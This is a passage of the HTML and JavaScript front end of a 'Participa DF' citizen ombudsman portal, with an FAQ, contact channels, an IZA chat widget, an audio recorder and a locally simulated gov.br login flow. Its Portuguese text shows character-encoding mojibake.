                    <summary class="flex justify-between items-center p-4 cursor-pointer font-bold text-slate-800 list-none select-none">
                        <span>A Ouvidoria pode resolver meu problema diretamente?</span>
                        <span class="transition-transform duration-300 group-open:rotate-180 text-[#004182]">
                            <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M19 9l-7 7-7-7"></path></svg>
                        </span>
                    </summary>
                    <div class="p-4 pt-0 text-slate-600 text-sm leading-relaxed border-t border-slate-200 mt-2">
                        <p>A Ouvidoria atua como uma ponte entre o cidad√£o e a administra√ß√£o p√∫blica. Ela recebe sua manifesta√ß√£o, analisa e a encaminha para a √°rea t√©cnica competente do √≥rg√£o respons√°vel, monitorando o prazo e a qualidade da resposta para garantir que voc√™ seja atendido.</p>
                    </div>
                </details>

                <!-- FAQ 7 -->
                <details class="group bg-slate-50 rounded-xl border border-slate-200 overflow-hidden transition-all hover:border-[#004182]">
                    <summary class="flex justify-between items-center p-4 cursor-pointer font-bold text-slate-800 list-none select-none">
                        <span>O que √© o Participa DF?</span>
                        <span class="transition-transform duration-300 group-open:rotate-180 text-[#004182]">
                            <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M19 9l-7 7-7-7"></path></svg>
                        </span>
                    </summary>
                    <div class="p-4 pt-0 text-slate-600 text-sm leading-relaxed border-t border-slate-200 mt-2">
                        <p>O <strong>Participa DF</strong> √© a plataforma integrada de ouvidoria e participa√ß√£o social do Governo do Distrito Federal. √â o canal oficial para voc√™ exercer sua cidadania, registrar manifesta√ß√µes e colaborar ativamente com a melhoria dos servi√ßos p√∫blicos.</p>
                    </div>
                </details>
            </div>
        </section>

        <!-- Outros Canais de Atendimento -->
        <section class="bg-white rounded-[2rem] shadow-lg p-6 border border-slate-100 animate-slide-up space-y-6">
            <h3 class="text-xl font-black text-[#004182] flex items-center gap-2">
                <svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M3 5a2 2 0 0 1 2-2h3.28a1 1 0 0 1 .948.684l1.498 4.493a1 1 0 0 1-.502 1.21l-2.257 1.13a11.042 11.042 0 0 0 5.516 5.516l1.13-2.257a1 1 0 0 1 1.21-.502l4.493 1.498a1 1 0 0 1 .684.949V19a2 2 0 0 1-2 2h-1C9.716 21 3 14.284 3 6V5z"></path></svg>
                Outros Canais de Atendimento
            </h3>
            <div class="grid md:grid-cols-3 gap-4">
                <!-- Central 162 -->
                <div class="bg-slate-50 p-4 rounded-xl border border-slate-200">
                    <h4 class="font-bold text-[#004182] mb-2 flex items-center gap-2">üìû Central 162</h4>
                    <p class="text-sm text-slate-600">Liga√ß√£o gratuita, de segunda a sexta, das 7h √†s 21h</p>
                </div>
                <!-- Email -->
                <div class="bg-slate-50 p-4 rounded-xl border border-slate-200">
                    <h4 class="font-bold text-[#004182] mb-2 flex items-center gap-2">üìß E-mail</h4>
                    <p class="text-sm text-slate-600 font-bold">ouvidoria@df.gov.br</p>
                    <p class="text-xs text-slate-500 mt-1">Resposta em at√© 2 dias √∫teis</p>
                </div>
                <!-- Presencial -->
                <div class="bg-slate-50 p-4 rounded-xl border border-slate-200">
                    <h4 class="font-bold text-[#004182] mb-2 flex items-center gap-2">üè¢ Atendimento Presencial</h4>
                    <p class="text-sm text-slate-600 font-bold">Na Hora - Unidades do DF</p>
                    <a href="https://www.df.gov.br" target="_blank" class="text-xs text-[#004182] font-bold hover:underline mt-1 block">Consulte os endere√ßos no site oficial</a>
                </div>
            </div>
        </section>

        <!-- Base Legal -->
        <section class="bg-white rounded-[2rem] shadow-lg p-6 border border-slate-100 animate-slide-up space-y-6">
            <h3 class="text-xl font-black text-[#004182] flex items-center gap-2">
                <svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
                Base Legal
            </h3>
            <div class="space-y-4">
                <div class="flex gap-3 items-start">
                    <div class="w-1.5 h-1.5 rounded-full bg-[#004182] mt-2 shrink-0"></div>
                    <div>
                        <p class="font-bold text-slate-800">Lei n¬∫ 13.460/2017</p>
                        <p class="text-sm text-slate-600">Disp√µe sobre participa√ß√£o, prote√ß√£o e defesa dos direitos do usu√°rio dos servi√ßos p√∫blicos da administra√ß√£o p√∫blica.</p>
                    </div>
                </div>
                <div class="flex gap-3 items-start">
                    <div class="w-1.5 h-1.5 rounded-full bg-[#004182] mt-2 shrink-0"></div>
                    <div>
                        <p class="font-bold text-slate-800">Decreto n¬∫ 37.625/2016</p>
                        <p class="text-sm text-slate-600">Regulamenta a Lei de Acesso √† Informa√ß√£o no √¢mbito do Distrito Federal.</p>
                    </div>
                </div>
            </div>
            
            <div class="pt-4 border-t border-slate-100">
                <a href="https://www.df.gov.br/" target="_blank" class="inline-flex items-center gap-2 bg-[#004182] text-white px-6 py-3 rounded-xl font-bold hover:bg-blue-900 transition-all">
                    Acessar portal oficial do GDF
                    <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg>
                </a>
            </div>
        </section>
        </div>
        </div>
    </main>

    <!-- Rodap√© -->
    <footer class="bg-[#071D41] text-white py-12 mt-12 border-t-4 border-[#004182]">
        <div class="max-w-6xl mx-auto px-4">
            <!-- Branding Centered -->
            <div class="space-y-4 text-center">
                <div class="flex justify-center items-center gap-3 mb-6">
                    <div class="bg-white/10 p-2 rounded-lg">
                        <span class="font-black text-2xl tracking-tighter">DF</span>
                    </div>
                    <div class="h-8 w-px bg-slate-600"></div>
                    <div>
                        <span class="font-bold text-xl tracking-tight block">Participa DF</span>
                    </div>
                </div>
                <div class="mb-8">
                    <h4 class="font-bold text-white text-lg">Ouvidoria Digital</h4>
                    <p class="text-slate-300 text-sm leading-relaxed mt-1">
                        A voz do cidad√£o transformando o Distrito Federal.
                    </p>
                </div>
            </div>
        </div>

        <div class="max-w-6xl mx-auto pt-8 border-t border-slate-700 text-center">
            <p class="mb-2">¬© 2026 Governo do Distrito Federal. Todos os direitos reservados.</p>
            <p>Desenvolvido em conformidade com o <a href="https://www.gov.br/ds/home" target="_blank" class="text-slate-300 hover:text-white underline">Padr√£o Digital de Governo (GOV.BR)</a></p>
        </div>
    </footer>

    <!-- Chat IZA -->
    <div id="izaChat" class="iza-chat-window">
        <div class="bg-gradient-to-r from-[#004182] to-[#0C3B66] p-4 text-white flex justify-between items-center shadow-sm">
            <div class="flex items-center gap-2">
                <img src="https://ouvidoria.df.gov.br/wp-content/uploads/2022/12/IZA_Robo_CGDF_Prancheta_1-1.png" alt="IZA" class="w-10 h-10 rounded-full bg-white/20 object-cover">
                <div>
                    <h4 class="font-black text-sm uppercase">IZA - Assistente</h4>
                    <span class="text-[10px] opacity-80 flex items-center gap-1">
                        <span class="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
                        Online
                    </span>
                </div>
            </div>
            <button onclick="toggleIza()" class="hover:bg-white/10 p-1 rounded transition-colors" title="Fechar">
                <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"></path></svg>
            </button>
        </div>
        <div id="chatContent" class="flex-1 p-4 overflow-y-auto space-y-4 bg-slate-50">
            <div class="bg-white p-3 rounded-2xl rounded-tl-none shadow-sm border border-slate-100 max-w-[80%]">
                <p class="text-sm font-medium">üëã Ol√°! Sou a IZA. Selecione uma d√∫vida comum abaixo ou digite sua pergunta:</p>
            </div>
            <div class="flex flex-col gap-2 animate-slide-up">
                <button onclick="sendChatMessage('Como fazer uma den√∫ncia?')" class="text-left bg-white p-3 rounded-xl border border-slate-200 text-sm text-[#004182] font-bold hover:bg-blue-50 transition-colors shadow-sm">üö® Como fazer uma den√∫ncia?</button>
                <button onclick="sendChatMessage('Qual o prazo de resposta?')" class="text-left bg-white p-3 rounded-xl border border-slate-200 text-sm text-[#004182] font-bold hover:bg-blue-50 transition-colors shadow-sm">‚è≥ Qual o prazo de resposta?</button>
                <button onclick="sendChatMessage('Como acompanhar meu protocolo?')" class="text-left bg-white p-3 rounded-xl border border-slate-200 text-sm text-[#004182] font-bold hover:bg-blue-50 transition-colors shadow-sm">üîç Como acompanhar?</button>
                <button onclick="sendChatMessage('√â seguro/an√¥nimo?')" class="text-left bg-white p-3 rounded-xl border border-slate-200 text-sm text-[#004182] font-bold hover:bg-blue-50 transition-colors shadow-sm">üïµÔ∏è √â seguro/an√¥nimo?</button>
            </div>
        </div>
        <div class="p-3 bg-white border-t border-slate-100 flex gap-2 items-center">
            <div id="izaVoiceIndicator" class="loading-voice">
                <div class="dot"></div><div class="dot"></div><div class="dot"></div> overflow-hidden p-1
        <img src="https://ouvidoria.df.gov.br/wp-content/uploads/2022/12/IZA_Robo_CGDF_Prancheta_1-1.png" alt="IZA" class="w-full h-full object-cover rounded-xl">      <span class="text-[10px] font-bold text-red-500 uppercase ml-1">IZA Ouve...</span>
            </div>
            <input type="text" id="chatInput" placeholder="Digite sua d√∫vida..." class="flex-1 p-2.5 bg-slate-100 rounded-lg outline-none text-sm font-medium focus:ring-2 ring-blue-500 focus:bg-white transition-all" onkeypress="handleChatKeypress(event)">
            <button onclick="sendChatMessage()" class="bg-[#004182] text-white p-2.5 rounded-lg hover:bg-blue-900 transition-colors" title="Enviar">
                <svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M16.6915026,12.4744748 L3.50612381,13.2599618 C3.19218622,13.2599618 3.03521743,13.4170592 3.03521743,13.5741566 L1.15159189,20.0151496 C0.8376543,20.8006365 0.99,21.89 1.77946707,22.52 C2.41,22.99 3.50612381,23.1 4.13399899,22.9429026 L21.714504,14.0454487 C22.6563168,13.5741566 23.1272231,12.6315722 22.9702544,11.6889879 L4.13399899,1.01449236 C3.34915502,0.9 2.40734225,1.00636533 1.77946707,1.4776575 C0.994623095,2.10604706 0.837654326,3.0486314 1.15159189,3.99701575 L3.03521743,10.4380088 C3.03521743,10.5950699 3.19218622,10.7521672 3.50612381,10.7521672 L16.6915026,11.5376541 C16.6915026,11.5376541 17.1624089,11.5376541 17.1624089,11.0663619 L17.1624089,12.4744748 C17.1624089,12.4744748 17.1624089,12.9457669 16.6915026,12.4744748 Z"></path></svg>
            </button>
        </div>
    </div>

    <!-- Bot√£o Flutuante IZA -->
    <button onclick="toggleIza()" class="fixed bottom-6 right-6 w-16 h-16 bg-gradient-to-br from-[#004182] to-[#003060] text-white rounded-2xl shadow-2xl flex items-center justify-center transition-all hover:scale-110 active:scale-90 border-4 border-white z-40 hover:shadow-blue-300/50 overflow-hidden p-1" id="izaButton" title="Assistente IZA">
        <img src="https://ouvidoria.df.gov.br/wp-content/uploads/2022/12/IZA_Robo_CGDF_Prancheta_1-1.png" alt="IZA" class="w-full h-full object-cover rounded-xl">
    </button>

    <!-- Profile Modal -->
    <div id="profileModal" class="modal">
        <div class="modal-content max-w-sm">
            <div class="flex justify-between items-center mb-4">
                <h3 class="text-xl font-black text-[#004182]">Meu Perfil</h3>
                <button onclick="closeProfileModal()" class="text-slate-400 hover:text-slate-600 transition-colors">
                    <svg width="24" height="24" fill="currentColor" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"></path></svg>
                </button>
            </div>
            <div class="space-y-4 mb-6">
                <div>
                    <label class="text-xs font-bold text-slate-500 uppercase mb-1 block">Nome Completo</label>
                    <div class="flex gap-2">
                        <input type="text" id="profileNameInput" class="w-full p-2 border rounded-lg font-bold text-slate-800" disabled>
                        <button onclick="enableEdit('profileNameInput')" class="text-[#004182] hover:bg-blue-50 p-2 rounded"><svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg></button>
                    </div>
                </div>
                <div>
                    <label class="text-xs font-bold text-slate-500 uppercase mb-1 block">Email</label>
                    <div class="flex gap-2">
                        <input type="email" id="profileEmailInput" class="w-full p-2 border rounded-lg font-bold text-slate-800" disabled>
                        <button onclick="enableEdit('profileEmailInput')" class="text-[#004182] hover:bg-blue-50 p-2 rounded"><svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg></button>
                    </div>
                </div>
                <div>
                    <p class="text-xs font-bold text-slate-500 uppercase mb-1">Total de Manifesta√ß√µes</p>
                    <p id="manifestCount" class="font-bold text-2xl text-[#004182]">0</p>
                </div>
            </div>
            <button onclick="closeProfileModal(); scrollToTrackingPanel();" class="w-full bg-[#004182] hover:bg-blue-900 text-white py-3 rounded-xl font-bold transition-all mb-2">Ver Minhas Manifesta√ß√µes</button>
            <button onclick="logout()" class="w-full bg-red-100 hover:bg-red-200 text-red-700 py-3 rounded-xl font-bold transition-all">Fazer Logout</button>
        </div>
    </div>

    <!-- Audio Recorder Modal -->
    <div id="audioRecorderModal" class="modal">
        <div class="modal-content max-w-sm text-center relative">
            <h3 class="text-xl font-black text-[#004182] mb-4">Gravar √Åudio</h3>
            <div id="recordingVisualizer" class="h-16 bg-slate-100 rounded-xl mb-4 flex items-center justify-center gap-2">
                <div class="w-1.5 h-4 bg-slate-400 rounded-full transition-all duration-75"></div>
                <div class="w-1.5 h-8 bg-slate-400 rounded-full transition-all duration-75"></div>
                <div class="w-1.5 h-4 bg-slate-400 rounded-full transition-all duration-75"></div>
                <div class="w-1.5 h-6 bg-slate-400 rounded-full transition-all duration-75"></div>
                <div class="w-1.5 h-3 bg-slate-400 rounded-full transition-all duration-75"></div>
            </div>
            <p id="recordingTimer" class="font-mono text-3xl font-bold text-slate-700 mb-8">00:00</p>
            
            <div class="flex justify-center gap-6 mb-4">
                <button id="btnStartRecord" onclick="startRecording()" class="w-20 h-20 rounded-full bg-red-500 hover:bg-red-600 text-white flex items-center justify-center shadow-xl transition-all hover:scale-105 active:scale-95 ring-4 ring-red-100">
                    <svg width="32" height="32" fill="currentColor" viewBox="0 0 24 24"><circle cx="12" cy="12" r="8"></circle></svg>
                </button>
                <button id="btnStopRecord" onclick="stopRecording()" class="hidden w-20 h-20 rounded-full bg-slate-800 hover:bg-black text-white flex items-center justify-center shadow-xl transition-all hover:scale-105 active:scale-95 ring-4 ring-slate-200">
                    <svg width="32" height="32" fill="currentColor" viewBox="0 0 24 24"><rect x="6" y="6" width="12" height="12" rx="2"></rect></svg>
                </button>
            </div>
            
            <div id="audioPreviewContainer" class="hidden mt-6 space-y-4">
                <audio id="audioPreview" controls class="w-full"></audio>
                <div class="flex gap-3">
                    <button onclick="saveRecording()" class="flex-1 bg-[#004182] text-white py-3 rounded-xl font-bold hover:bg-blue-900 transition-colors">Usar Grava√ß√£o</button>
                    <button onclick="resetRecording()" class="flex-1 bg-slate-100 text-slate-600 py-3 rounded-xl font-bold hover:bg-slate-200 transition-colors">Descartar</button>
                </div>
            </div>

            <button onclick="closeAudioRecorder()" class="absolute top-4 right-4 text-slate-400 hover:text-slate-600 p-2 rounded-full hover:bg-slate-100 transition-colors">
                <svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M18 6L6 18M6 6l12 12"></path></svg>
            </button>
        </div>
    </div>

    <script>
        // ========== ESTADO GLOBAL ==========
        let currentScale = 100;
        let isLoggedIn = localStorage.getItem('isLoggedIn') === 'true';
        let userProfile = JSON.parse(localStorage.getItem('userProfile') || 'null');
        let userManifestations = JSON.parse(localStorage.getItem('userManifestations') || '[]');
        let attachedFiles = {}; // Armazena m√∫ltiplos arquivos
        
        // Vari√°veis de Grava√ß√£o
        let mediaRecorder;
        let audioChunks = [];
        let audioBlob;
        let recordingInterval;
        let recordingStartTime;

        // ========== CONFIGURA√á√ÉO GOV.BR REAL ==========
        // Para usar o login oficial:
        // 1. Obtenha um Client ID no Gov.br
        // 2. Mude useRealLogin para true
        // 3. Configure seu Client ID abaixo
        const GOVBR_CONFIG = {
            useRealLogin: false, // Mude para true para ativar o redirecionamento real
            clientId: 'SEU_CLIENT_ID', // Coloque seu Client ID aqui
            authUrl: 'https://sso.acesso.gov.br/authorize'
        };

        // ========== INICIALIZA√á√ÉO ==========
        document.addEventListener('DOMContentLoaded', function() {
            lucide.createIcons();
            setupEventListeners();
            checkLoginStatus();
            checkGovBrCallback(); // Verifica se voltou do login oficial
        });

        function setupEventListeners() {
            document.getElementById('anonimo').addEventListener('change', toggleIdentificationFields);
            document.getElementById('manifestForm').addEventListener('submit', handleFormSubmit);
            toggleIdentificationFields();
        }

        // ========== NAVEGA√á√ÉO POR ABAS ==========
        function switchTab(tab) {
            const homeContent = document.getElementById('content-home');
            const helpContent = document.getElementById('content-help');
            const homeTab = document.getElementById('tab-home');
            const helpTab = document.getElementById('tab-help');

            if (tab === 'home') {
                homeContent.classList.remove('hidden');
                helpContent.classList.add('hidden');
                homeTab.className = "px-6 py-2 rounded-full font-bold bg-[#004182] text-white shadow-md transition-all hover:scale-105";
                helpTab.className = "px-6 py-2 rounded-full font-bold bg-white text-slate-600 shadow-sm hover:bg-slate-100 transition-all hover:scale-105";
                window.scrollTo({ top: 0, behavior: 'smooth' });
            } else {
                homeContent.classList.add('hidden');
                helpContent.classList.remove('hidden');
                helpTab.className = "px-6 py-2 rounded-full font-bold bg-[#004182] text-white shadow-md transition-all hover:scale-105";
                homeTab.className = "px-6 py-2 rounded-full font-bold bg-white text-slate-600 shadow-sm hover:bg-slate-100 transition-all hover:scale-105";
                window.scrollTo({ top: 0, behavior: 'smooth' });
            }
        }

        // ========== ACESSIBILIDADE ==========
        function toggleContrast() {
            document.body.classList.toggle('high-contrast');
            localStorage.setItem('highContrast', document.body.classList.contains('high-contrast'));
        }

        function changeFontSize(delta) {
            currentScale += delta * 10;
            currentScale = Math.min(Math.max(currentScale, 80), 150);
            document.documentElement.style.fontSize = currentScale + '%';
            localStorage.setItem('fontSize', currentScale);
        }

        if (localStorage.getItem('highContrast') === 'true') {
            document.body.classList.add('high-contrast');
        }
        if (localStorage.getItem('fontSize')) {
            currentScale = parseInt(localStorage.getItem('fontSize'));
            document.documentElement.style.fontSize = currentScale + '%';
        }

        function closeGovBrLogin() {
            document.getElementById('govbr-login-screen').style.display = 'none';
            document.body.style.overflow = 'auto';
        }

        // ========== AUTENTICA√á√ÉO ==========
        function checkLoginStatus() {
            if (isLoggedIn) {
                showLoggedInUser();
            }
        }

        // ========== FLUXO DE LOGIN GOV.BR (SIMULADO) ==========
        function startGovBrFlow() {
            // Se estiver configurado para usar o login real
            if (GOVBR_CONFIG.useRealLogin) {
                const redirectUri = encodeURIComponent(window.location.href.split('?')[0]);
                const scope = encodeURIComponent('openid email profile phone');
                const url = `${GOVBR_CONFIG.authUrl}?response_type=code&client_id=${GOVBR_CONFIG.clientId}&redirect_uri=${redirectUri}&scope=${scope}`;
                window.location.href = url;
                return;
            }

            document.getElementById('govbr-login-screen').style.display = 'block';
            document.body.style.overflow = 'hidden'; // Impede rolagem da p√°gina principal
            
            // Resetar estados
            document.getElementById('govbr-step-1').classList.remove('hidden');
            document.getElementById('govbr-step-2').classList.add('hidden');
            document.getElementById('govbr-cpf').value = '';
            document.getElementById('govbr-password').value = '';
            
            // Resetar imagem lateral
            const sideImg = document.getElementById('govbr-side-img');
            if(sideImg) sideImg.src = 'https://sso.acesso.gov.br/assets/govbr/img/conta_govbr_v2.jpg';
        }

        // Tratamento do retorno do Gov.br Real
        function checkGovBrCallback() {
            const urlParams = new URLSearchParams(window.location.search);
            const code = urlParams.get('code');

            if (code) {
                // Limpar URL visualmente
                window.history.replaceState({}, document.title, window.location.pathname);
                
                // Como n√£o temos backend para trocar o code pelo token neste arquivo est√°tico,
                // simulamos o sucesso do login mantendo o armazenamento local.
                // Em produ√ß√£o real, voc√™ enviaria este 'code' para seu backend.
                
                isLoggedIn = true;
                localStorage.setItem('isLoggedIn', 'true');

                // Criar perfil simulado baseado no sucesso do login
                userProfile = {
                    name: 'Cidad√£o(√£) Gov.br',
                    email: 'cidadao@acesso.gov.br',
                    cpf: '***.***.***-**'
                };
                localStorage.setItem('userProfile', JSON.stringify(userProfile));

                showLoggedInUser();
                appendChatMessage('Login via Gov.br realizado com sucesso! Seus dados foram autenticados.');
            }
        }

        function formatCPF(input) {
            let value = input.value.replace(/\D/g, '');
            if (value.length > 11) value = value.slice(0, 11);
            
            if (value.length > 9) {
                value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2}).*/, '$1.$2.$3-$4');
            } else if (value.length > 6) {
                value = value.replace(/^(\d{3})(\d{3})(\d{3}).*/, '$1.$2.$3');
            } else if (value.length > 3) {
                value = value.replace(/^(\d{3})(\d{3}).*/, '$1.$2');
            }
            input.value = value;
        }

        function handleGovBrStep1() {
            const cpf = document.getElementById('govbr-cpf').value.replace(/\D/g, '');
            if (cpf.length !== 11) {
                alert('Por favor, digite um CPF v√°lido.');
                return;
            }
            
            // Simula loading
            const btn = document.querySelector('#govbr-step-1 .govbr-btn');
            const originalText = btn.innerText;
            btn.innerText = 'Aguarde...';
            
            setTimeout(() => {
                document.getElementById('govbr-step-1').classList.add('hidden');
                document.getElementById('govbr-step-2').classList.remove('hidden');
                document.getElementById('govbr-cpf-display').innerText = document.getElementById('govbr-cpf').value;
                
                // Mudar imagem para senha
                const sideImg = document.getElementById('govbr-side-img');
                if(sideImg) sideImg.src = 'https://sso.acesso.gov.br/assets/govbr/img/senha.png';
                
                btn.innerText = originalText;
            }, 800);
        }

        function handleGovBrLogin() {
            const password = document.getElementById('govbr-password').value;
            if (password.length < 4) {
                alert('Senha inv√°lida.');
                return;
            }

            // Login Sucesso
            isLoggedIn = true;
            localStorage.setItem('isLoggedIn', 'true');

            // Salvar/Recuperar Perfil
            const cpf = document.getElementById('govbr-cpf').value;
            if (!userProfile || userProfile.cpf !== cpf) {
                userProfile = {
                    name: 'Cidad√£o(√£)',
                    email: cpf.replace(/\D/g, '') + '@cidadao.gov.br',
                    cpf: cpf
                };
                localStorage.setItem('userProfile', JSON.stringify(userProfile));
            }
            
            // Fechar tela gov.br
            document.getElementById('govbr-login-screen').style.display = 'none';
            document.body.style.overflow = 'auto';
            
            showLoggedInUser();
            appendChatMessage('Bem-vindo! Voc√™ est√° conectado e seus dados est√£o protegidos conforme a LGPD.');
        }

        function simulateExternalLogin(provider) {
            // Simula login via Banco ou Certificado
            const btn = event.currentTarget;
            const originalText = btn.innerHTML;
            btn.innerHTML = 'Conectando...';
            btn.disabled = true;

            setTimeout(() => {
                isLoggedIn = true;
                localStorage.setItem('isLoggedIn', 'true');

                // Cria perfil simulado
                userProfile = {
                    name: 'Cidad√£o(√£) via ' + provider,
                    email: 'contato@' + provider.toLowerCase().replace(/\s/g, '') + '.com.br',
                    cpf: '000.000.000-00'
                };
                localStorage.setItem('userProfile', JSON.stringify(userProfile));

                closeGovBrLogin();
                showLoggedInUser();
                appendChatMessage(`Bem-vindo! Login via ${provider} realizado com sucesso.`);
                btn.innerHTML = originalText;
                btn.disabled = false;
            }, 1500);
        }

        function showLoggedInUser() {
            document.getElementById('loginBtn').classList.add('hidden');
            document.getElementById('userProfile').classList.remove('hidden');
            if (userProfile && userProfile.name) {
                document.getElementById('userNameDisplay').textContent = userProfile.name.split(' ')[0];
                document.getElementById('userInitial').textContent = userProfile.name.charAt(0).toUpperCase();
            }
            updateTrackingPanel();
            lucide.createIcons();
        }

        function logout() {
            isLoggedIn = false;
            localStorage.removeItem('isLoggedIn');
            // Opcional: Limpar perfil ao sair? Geralmente mant√©m para UX, mas para seguran√ßa pode limpar.
            // localStorage.removeItem('userProfile'); 
            location.reload();
        }

        // ========== FORMUL√ÅRIO ==========
        function toggleIdentificationFields() {
            const isAnon = document.getElementById('anonimo').checked;
            const fields = document.getElementById('identificationFields');
            if (isAnon) {
                fields.classList.add('hidden');
                document.getElementById('nome').removeAttribute('required');
                document.getElementById('email').removeAttribute('required');
            } else {
                fields.classList.remove('hidden');
                document.getElementById('nome').setAttribute('required', 'required');
                document.getElementById('email').setAttribute('required', 'required');
            }
        }

        function handleFile(input, type) {
            if (input.files && input.files[0]) {
                const fileName = input.files[0].name;
                
                // Adiciona ao objeto de anexos
                attachedFiles[type] = fileName;
                renderAttachments();
                
                if (type === '√Åudio') {
                    const voice = document.getElementById('izaVoiceIndicator');
                    voice.classList.add('active');
                    setTimeout(() => {
                        voice.classList.remove('active');
                        appendChatMessage('üé§ Recebi seu √°udio! Estou anexando √† manifesta√ß√£o.');
                    }, 2500);
                }
            }
        }

        // ========== GRAVADOR DE √ÅUDIO ==========
        function openAudioRecorder() {
            document.getElementById('audioRecorderModal').classList.add('active');
            resetRecording();
        }

        function closeAudioRecorder() {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                stopRecording();
            }
            document.getElementById('audioRecorderModal').classList.remove('active');
        }

        async function startRecording() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(stream);
                audioChunks = [];
                
                mediaRecorder.ondataavailable = event => {
                    audioChunks.push(event.data);
                };
                
                mediaRecorder.onstop = () => {
                    audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    const audioUrl = URL.createObjectURL(audioBlob);
                    const audio = document.getElementById('audioPreview');
                    audio.src = audioUrl;
                    
                    document.getElementById('audioPreviewContainer').classList.remove('hidden');
                    document.getElementById('btnStartRecord').classList.remove('hidden');
                    document.getElementById('btnStopRecord').classList.add('hidden');
                    document.getElementById('btnStartRecord').classList.add('hidden'); // Hide start button when preview is shown
                    
                    // Stop visualizer animation
                    document.querySelectorAll('#recordingVisualizer div').forEach(div => {
                        div.classList.remove('animate-pulse', 'bg-red-400', 'h-8');
                        div.classList.add('bg-slate-400');
                    });
                };
                
                mediaRecorder.start();
                recordingStartTime = Date.now();
                
                // UI Updates
                document.getElementById('btnStartRecord').classList.add('hidden');
                document.getElementById('btnStopRecord').classList.remove('hidden');
                document.getElementById('audioPreviewContainer').classList.add('hidden');
                
                // Visualizer animation
                document.querySelectorAll('#recordingVisualizer div').forEach(div => {
                    div.classList.add('animate-pulse', 'bg-red-400');
                    // Random heights for visual effect
                    div.style.height = Math.max(10, Math.random() * 40) + 'px';
                });
                
                // Timer
                clearInterval(recordingInterval);
                recordingInterval = setInterval(updateRecordingTimer, 1000);
                
            } catch (err) {
                alert('Erro ao acessar microfone. Verifique as permiss√µes do navegador.');
                console.error(err);
            }
        }

        function stopRecording() {
            if (mediaRecorder) {
                mediaRecorder.stop();
                clearInterval(recordingInterval);
                mediaRecorder.stream.getTracks().forEach(track => track.stop());
            }
        }

        function updateRecordingTimer() {
            const diff = Math.floor((Date.now() - recordingStartTime) / 1000);
            const mins = Math.floor(diff / 60).toString().padStart(2, '0');
            const secs = (diff % 60).toString().padStart(2, '0');
            document.getElementById('recordingTimer').textContent = `${mins}:${secs}`;
            
            // Animate visualizer randomly
            document.querySelectorAll('#recordingVisualizer div').forEach(div => {
                if(mediaRecorder && mediaRecorder.state === 'recording') {
                    div.style.height = Math.max(10, Math.random() * 32) + 'px';
                }
            });
        }

        function resetRecording() {
            audioBlob = null;
            audioChunks = [];
            document.getElementById('audioPreview').src = '';
            document.getElementById('audioPreviewContainer').classList.add('hidden');
            document.getElementById('recordingTimer').textContent = '00:00';
            document.getElementById('btnStartRecord').classList.remove('hidden');
            document.getElementById('btnStopRecord').classList.add('hidden');
            
            document.querySelectorAll('#recordingVisualizer div').forEach(div => {
                div.classList.remove('animate-pulse', 'bg-red-400');
                div.classList.add('bg-slate-400');
                div.style.height = '16px';
            });
        }

        function saveRecording() {
            if (audioBlob) {
                const fileName = `gravacao_voz_${new Date().toLocaleTimeString().replace(/:/g, '-')}.webm`;
                attachedFiles['√Åudio'] = fileName;
                renderAttachments();
                closeAudioRecorder();
                
                // Feedback IZA
                const voice = document.getElementById('izaVoiceIndicator');
                if(voice) {
                    voice.classList.add('active');
                    setTimeout(() => {
                        voice.classList.remove('active');
                        appendChatMessage('üé§ Recebi sua grava√ß√£o de voz! Anexada com sucesso.');
                    }, 2500);
                }
            }
        }

        function removeAttachment(type) {
            delete attachedFiles[type];
            renderAttachments();
        }

        function renderAttachments() {
            const status = document.getElementById('fileStatus');
            if (Object.keys(attachedFiles).length === 0) {
                status.classList.add('hidden');
                status.classList.remove('flex');
                status.innerHTML = '';
                return;
            }
            status.classList.remove('hidden');
            status.classList.add('flex');
            status.innerHTML = Object.entries(attachedFiles).map(([key, value]) => `
                <div class="text-sm font-bold text-[#008C44] flex items-center gap-2 bg-green-50 p-3 rounded-lg border border-green-100 w-full">
                    <svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path></svg>
                    <span class="flex-1 truncate">${key}: ${value}</span>
